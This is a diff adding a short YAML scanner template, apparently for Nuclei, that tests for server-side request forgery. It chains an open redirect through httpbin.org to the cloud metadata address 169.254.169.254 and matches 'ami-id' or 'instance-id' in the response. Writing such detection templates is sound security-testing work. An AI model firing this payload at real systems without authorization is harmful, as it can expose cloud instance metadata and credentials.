@@ -1,0 +1,23 @@
+id: whai-ssrf-via-redirect
+
+info:
+  name: SSRF via Open Redirect Chain
+  author: whitehat-ai
+  severity: high
+  description: Tests SSRF by chaining open redirect
+  tags: ssrf,redirect,high
+  classification:
+    cwe-id: CWE-918
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=https://httpbin.org/redirect-to?url=http://169.254.169.254/"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+        condition: or
